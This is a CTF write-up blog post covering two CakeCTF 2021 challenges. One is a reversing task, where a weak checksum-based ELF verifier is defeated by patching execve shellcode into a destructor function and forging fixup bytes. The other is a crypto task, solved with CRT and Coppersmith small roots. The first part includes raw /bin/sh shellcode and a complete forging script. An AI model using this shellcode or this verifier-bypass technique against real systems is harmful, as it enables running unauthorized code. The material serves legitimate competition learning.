---
path: /posts/2021-08-29-cakectf-2021-writeups
title: CakeCTF 2021 Writeups
date: 2021-08-29
tags: ctf,infosec,writeup,crypto,reversing
---

Fun CTF!

|Challenge|Tags|Solves|
|---|---|---|
|[ALDRYA](#aldrya)|`reversing`|18|
|[Party Ticket](#party-ticket)|`crypto` `coppersmith`|12|

# ALDRYA <a name="aldrya"></a>

> I'm scared of executing a malicious ELF file. That's why I invented this new ELF-verify system named ALDRYA.
> 
> `nc misc.cakectf.com 10029`

## Challenge Analysis

We are presented with a service that executes any ELF file we provide it, but only if it is verified. We are given a sample hello world ELF `sample.elf` as well as its corresponding aldrya verification file `sample.aldrya`. The ELF we provide the service must verify under this sample verification file. This means that we can send the `sample.elf` file and it will happily print `Hello, Aldrya!` but if we make any changes, the server won't run the file. The goal will be to craft an ELF file that gives us a shell (or reads the flag) while also properly verifying under the given sample verification file.

### Verification Algorithm

Reversing the `aldrya` binary is very simple with Ghidra or IDA decompilation. We see that it verifies the ELF against the verification file as follows:

1. Firstly, check that the ELF file has the correct magic bytes
2. Check that the size of the ELF file corresponds to the first 4 bytes of the verification file (the first 4 bytes of the verification file should be an integer representing the number of "chunks" in the ELF file)
3. Validate each "chunk" of the ELF file against a 4 byte integer from the verification file

We explore step 3 in more detail. A "chunk" of the ELF file is just `0x100` bytes. The first chunk starts from the very first byte, so chunks are always nicely aligned on `0x100`. For a given chunk of bytes, the algorithm computes:

```py
U = 0x20210828
for b in chunk:
    U = (U ^ b) >> 1 | (((U ^ b) & 1) << 0x1f)
```

and then checks whether or not `U` is equal to the corresponding 4 byte integer from the verification file.

## Crafting a Malicious ELF File

We first note that each chunk is more or less independent of each other; changing bytes in the first chunk will only cause the first chunk's verification to fail (though to pass the verification, we need all chunks to verify properly). We decided it would be a good idea to work off the `sample.elf` and modify one chunk to get a shell. The main idea is to find a chunk which contains code that will be executed, but which also allows us to have some freedom so that we can manipulate the verification value for that chunk.

At first, we tried targeting `main` (`0x1149-0x116f`), but with [shellcode](http://shell-storm.org/shellcode/files/shellcode-806.php) of around 27 bytes, this would leave only 11 bytes to manipulate the verification value. We can't write beyond `0x116f` as this will corrupt `__libc_csu_init` and will cause the program to segfault upon execution. As we will see later, having 32 bytes of freedom makes manipulating the verification value a lot easier.

After searching for a while, we eventually stumbled across `__do_global_dtors_aux` which starts at `0x1100`. We would be able to write up to 63 bytes from here without messing anything else up, so for a 27 byte shellcode this leaves 36 bytes to mess with the verification value. This function gets called before exiting and there are enough bytes of freedom, so this is perfect.

### Fixing the Verification Value

Revisiting the algorithm that computes the verification value, we see that it maintains a state which is affected by all of the bytes it has been through so far. Let `U` be the current state, and `b` be the byte it is checking. Then the state is updated as follows:

1. XOR `U` with `b` and right shift by one
2. Set the MSB to the LSB of `U ^ b`

Therefore, we see that after 32 bytes, the state is simply determine completely by the LSB of each byte (as well as the previous state).

Now, after modifying the sample ELF file, the chunk that we modified will have an incorrect verification value. We are only modifying the first 63 bytes of the chunk, so the goal will be to use the 32 bytes of freedom to get the state to be the same as the sample ELF's at the end of these 63 bytes. To do this, we write either a `\x00` byte or a `\x01` byte depending on the LSB of the original verification value, and the LSB of the modified verification value up til the end of the shellcode (just before the start of our "fixing up bytes"). Specifically, if `o` is the original verification value, and `m` is the modified verification value, then to change one bit of `m` to the same bit of `o`, we add the byte given by `(o & 1) ^ (m & 1)`. Because of the shifts, doing this for 32 bytes ensures we get the desired value.

```py
def validate_elf(elf, aldrya):
    elf_chunks = [elf[i:i+0x100] for i in range(0, len(elf), 0x100)]
    verif_vals = [int.from_bytes(aldrya[i:i+4], 'little') for i in range(0, len(aldrya), 4)]
    for i, (elf_chunk, sig_chunk) in enumerate(zip(elf_chunks, verif_vals)):
        s = vxor(elf_chunk.ljust(0x100, b'\x00'))
        if s != sig_chunk:
            print('chunk:', elf_chunk)
            print(f'aldrya check failed at {i}:')
            print(f'got: {hex(s)}, expected: {hex(sig_chunk)}')
            return False
    return True

def vxor(w):
    U = 0x20210828
    for b in w:
        U = (U ^ b) >> 1 | ((U ^ b) & 1) << 0x1f
    return U

elf = open('./chall/sample.elf', 'rb').read()
aldrya = open('./chall/sample.aldrya', 'rb').read()

# replace __do_global_dtors_aux with shellcode
sc = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + b'\x90'*36
shelf = elf[:0x1100] + sc + elf[0x1100 + len(sc):]

# get the running verification value for the original elf up to where
# our shellcode ends then change the trailing bytes such that the running
# verification value for the modified elf is the same at that point, so
# that the verification value will be the same for the entire chunk
orig_verif_val = vxor(elf[0x1100:0x1100+len(sc)])
mod_verif_val = vxor(shelf[0x1100:0x1100+len(sc)-32])

mod_str = b''
for i in range(32):
    b = (orig_verif_val & 1) ^ (mod_verif_val & 1)
    mod_str += chr(b).encode()
    orig_verif_val >>= 1
    mod_verif_val >>= 1

shelf = elf[:0x1100] + sc[:-32] + mod_str + elf[0x1100+len(sc):]

assert validate_elf(shelf, aldrya[4:])
open('sh.elf', 'wb').write(shelf)
```

Flag: `CakeCTF{jUst_cH3ck_SHA256sum_4nd_7h47's_f1n3}`

---

# Party Ticket <a name="party-ticket"></a>

> Komachi is going to invite Moe and Lulu to the party. But... she is shy and she encrypted the invitations. Nanado's secret mission is to decrypt these tickets so Komachi won't get lonely.

```py
from Crypto.Util.number import getPrime, isPrime
from hashlib import sha512
import random

def getSafePrime(bits):
    while True:
        p = getPrime(bits - 1)
        q = 2*p + 1
        if isPrime(q):
            return q

def make_inivitation():
    with open("flag.txt", "rb") as f:
        flag = f.read().strip()
        m = int.from_bytes(flag + sha512(flag).digest(), "big")

    p = getSafePrime(512)
    q = getSafePrime(512)

    n = p * q
    assert m < n

    b = random.randint(2, n-1)

    c = m*(m + b) % n

    return c, n, b

# print("Dear Moe:")
print(make_inivitation())

# print("Dear Lulu:")
print(make_inivitation())
```

## Challenge Analysis

We are given $(c_1, n_1, b_1)$ and $(c_2, n_2, b_2)$ where

$$
c_i \equiv m(m + b_i) \pmod{n_i}
$$

$m$ is the flag (with its SHA512 hash appended), $b_i$ is a random number less than $n_i$, and $n_i = p_i q_i$ is an RSA modulus.

We notice that we have a somewhat similar setting to Hastad's broadcast attack on RSA; indeed if we had $c_i \equiv m^2 \pmod{n_i}$ we could recover $m$ by using CRT to find $m^2$, and then taking the integer square root.

It turns out that we can still do something similar using these ideas. At least from an information theoretic viewpoint, it seems like we have the same amount of unknown information since we know the $b_i$.

## Chinese Remainder Theoerm

Recall that the Chinese Remainder Theorem allows us to solve for $x$ in the system of congruences (given that the moduli are pairwise coprime):

$$
\begin{aligned}
\begin{cases}
    c_1 &\equiv x \pmod {n_1} \\
    &\vdots \\
    c_l &\equiv x \pmod {n_l} \\
\end{cases}
\end{aligned}
$$

### Two-Dimensional CRT

In the case of two moduli, it is quite simple to construct $x$. Firstly, since $n_1$ and $n_2$ are coprime then there exists integers $k_1$ and $k_2$ such that $k_1 n_1 + k_2 n_2 = 1$. We can easily compute $k_1$ and $k_2$ with

$$
\begin{aligned}
k_1 &\equiv n_1^{-1} \pmod{n_2} \\
k_2 &\equiv n_2^{-1} \pmod{n_1}
\end{aligned}
$$

Now, a solution for $x$ is given by

$$
x = c_1 k_2 n_2 + c_2 k_1 n_1
$$

## Recovering $m$

Recall that $c_i \equiv m(m + b_i) \pmod{n_i}$. Since it is easier to reason with over the integers, we can write this as

$$
c_i = m(m + b_i) + l_i n_i
$$

where $l_i$ is an integer. Therefore, we can rewrite $x$ (the CRT solution from above) in terms of $m$ as follows:

$$
\begin{aligned}
    x &= c_1 k_2 n_2 + c_2 k_1 n_1 \\
      &= (m(m+b_1) + l_1 n_1) k_2 n_2 + (m(m+b_2) + l_2 n_2) k_1 n_1 \\
    &= (m^2 k_2 n_2  + m b_1 k_2 n_2 + l_1 n_1 k_2 n_2) + (m^2 k_1 n_1 + m b_2 k_1 n_1 + l_2 n _2 k_1 n_1) \\
    &= m^2 (k_2 n_2 + k_1 n_1) + m(b_1 k_2 n_2 + b_2 k_1 n_1) + n_1 n_2 (l_1 k_2 + l_2 k_1) \\
    &= m^2 + m(b_1 k_2 n_2 + b_2 k_1 n_1) + n_1 n_2 (l_1 k_2 + l_2 k_1)
\end{aligned}
$$

Finally, notice that this implies

$$
    x \equiv m^2 + m(b_1 k_2 n_2 + b_2 k_1 n_1) \pmod {n_1 n_2}
$$

or to put it in a more exciting way:

$$
    f(m) = m^2 + m(b_1 k_2 n_2 + b_2 k_1 n_1) - x \equiv 0 \pmod {n_1 n_2}
$$

It turns out that the flag length is small enough such that $m$ is less than 900 bits. So, compared to the 2048 bit modulus $n_1 n_2$, this polynomial has a small root, and that small root is $m$ :).

```py
from Crypto.Util.number import long_to_bytes

c1, n1, b1 = (39795129165179782072948669478321161038899681479625871173358302171683237835893840832234290438594216818679179705997157281783088604033668784734122669285858548434085304860234391595875496651283661871404229929931914526131264445207417648044425803563540967051469010787678249371332908670932659894542284165107881074924, 68660909070969737297724508988762852362244900989155650221801858809739761710736551570690881564899840391495223451995828852734931447471673160591368686788574452119089378643644806717315577499800198973149266893774763827678504269587808830214845193664196824803341291352363645741122863749136102317353277712778211746921, 67178092889486032966910239547294187275937064814538687370261392801988475286892301409412576388719256715674626198440678559254835210118951299316974691924547702661863023685159440234566417895869627139518545768653628797985530216197348765809818845561978683799881440977147882485209500531050870266487696442421879139684)
c2, n2, b2 = (36129665029719417090875571200754697953719279663088594567085283528953872388969769307850818115587391335775050603174937738300553500364215284033587524409615295754037689856216651222399084259820740358670434163638881570227399889906282981752001884272665493024728725562843386437393437830876306729318240313971929190505, 126991469439266064182253640334143646787359600249751079940543800712902350262198976007776974846490305764455811952233960442940522062124810837879374503257253974693717431704743426838043079713490230725414862073192582640938262060331106418061373056529919988728695827648357260941906124164026078519494251443409651992021, 126361241889724771204194948532709880824648737216913346245821320121024754608436799993819209968301950594061546010811840952941646399799787914278677074393432618677546231281655894048478786406241444001324129430720968342426822797458373897535424257744221083876893507563751916046235091732419653547738101160488559383290)

k1 = int(pow(n1, -1, n2))
k2 = int(pow(n2, -1, n1))
x = c1*k2*n2 + c2*k1*n1

P.<m> = PolynomialRing(Zmod(n1*n2))
f = m^2 + m*(b1*k2*n2 + b2*k1*n1) - x
flag = f.small_roots(X=2^(55*8 + 512), beta=0.5, epsilon=1/64)[0]
print(long_to_bytes(flag)[:-64].decode())
```

Flag: `CakeCTF{710_i5_5m4r73r_7h4n_R4bin_4nd_H4574d}`
